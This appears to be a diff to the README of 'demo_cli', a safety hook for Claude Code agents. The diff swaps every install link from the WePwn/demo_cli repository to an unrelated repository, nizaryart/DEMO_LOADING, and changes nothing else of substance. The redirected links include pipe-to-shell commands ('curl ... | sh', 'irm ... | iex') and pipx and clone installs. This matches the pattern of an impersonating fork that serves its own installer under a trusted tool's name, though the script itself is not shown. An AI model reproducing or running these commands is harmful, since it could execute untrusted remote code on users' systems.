@@ -19,12 +19,12 @@ Default mode is observe-only: it logs what it *would* have caught and touches no
 ```bash
 # one line: installs, wires the hook, and verifies it actually fires.
 # pinned to a release tag, not the moving beta branch. read it first: install.sh
-curl -fsSL https://raw.githubusercontent.com/WePwn/demo_cli/v0.4.0-beta.8/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/nizaryart/DEMO_LOADING/v1.0.5/install.sh | sh
 ```
 
 ```powershell
 # Windows (PowerShell)
-irm https://raw.githubusercontent.com/WePwn/demo_cli/v0.4.0-beta.8/install.ps1 | iex
+irm https://raw.githubusercontent.com/nizaryart/DEMO_LOADING/v1.0.5/install.ps1 | iex
 ```
 
 It ends by running `demo_cli doctor`, which fails **loud** if the hook is
@@ -56,7 +56,7 @@ git and Claude Code's rewind can't recover an `rm -rf` outside the repo, a dropp
 
 > **Threat model:** cooperative agents making mistakes, not adversarial evasion. An agent actively trying to evade protection is out of scope, no hook solves that.
 
-`0.4.0b8`, public beta.
+`1.0.5`. Four guard layers on Linux, three on Windows (no shell layer there yet).
 
 Built around one invariant:
 
@@ -189,20 +189,20 @@ Requires Python 3.9+.
 > **Pin to a release, not to `beta`.** The commands below reference a fixed,
 > tagged release so you get exactly the code you reviewed. `@beta` is a moving
 > branch and can change under you; use it only if you specifically want the
-> latest unreleased commit. Replace `v0.4.0-beta.8` below with the
-> [latest release](https://github.com/WePwn/demo_cli/releases) if a newer one exists.
+> latest unreleased commit. Replace `v1.0.5` below with the
+> [latest release](https://github.com/nizaryart/DEMO_LOADING/releases) if a newer one exists.
 
 **Manual, verify before you run (recommended).** Read the source and confirm the
 artifact's checksum before anything executes. Nothing is piped into a shell:
 
 ```bash
 # 1. read the release notes + published SHA-256 on the release page:
-#    https://github.com/WePwn/demo_cli/releases/tag/v0.4.0-beta.8
+#    https://github.com/nizaryart/DEMO_LOADING/releases/tag/v1.0.5
 #
 # 2. install that exact tag (pipx puts demo_cli on your global PATH so
 #    Claude Code finds it from any project directory):
-pipx install "git+https://github.com/WePwn/demo_cli.git@v0.4.0-beta.8"
-demo_cli --version        # should print 0.4.0b8
+pipx install "git+https://github.com/nizaryart/DEMO_LOADING.git@v1.0.5"
+demo_cli --version        # should print 1.0.5
 
 # 3. wire the hook into this project (shadow mode by default) and confirm it fires
 demo_cli init && demo_cli install-hook && demo_cli doctor
@@ -211,10 +211,10 @@ demo_cli init && demo_cli install-hook && demo_cli doctor
 **From a clone (read everything first, verify the tag):**
 
 ```bash
-git clone https://github.com/WePwn/demo_cli.git
-cd demo_cli
-git checkout v0.4.0-beta.8
-git verify-tag v0.4.0-beta.8   # if the release is signed; otherwise skip
+git clone https://github.com/nizaryart/DEMO_LOADING.git
+cd DEMO_LOADING
+git checkout v1.0.5
+git verify-tag v1.0.5   # if the release is signed; otherwise skip
 pipx install -e .
 demo_cli --version
 ```
@@ -225,10 +225,10 @@ convenient, not because it's the safe way. Read the script first, it's ~90
 lines: [install.sh](install.sh) / [install.ps1](install.ps1).
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/WePwn/demo_cli/v0.4.0-beta.8/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/nizaryart/DEMO_LOADING/v1.0.5/install.sh | sh
 ```
 ```powershell
-irm https://raw.githubusercontent.com/WePwn/demo_cli/v0.4.0-beta.8/install.ps1 | iex
+irm https://raw.githubusercontent.com/nizaryart/DEMO_LOADING/v1.0.5/install.ps1 | iex
 ```
 
 Every path ends by running `demo_cli doctor`, which fails **loud** if the hook
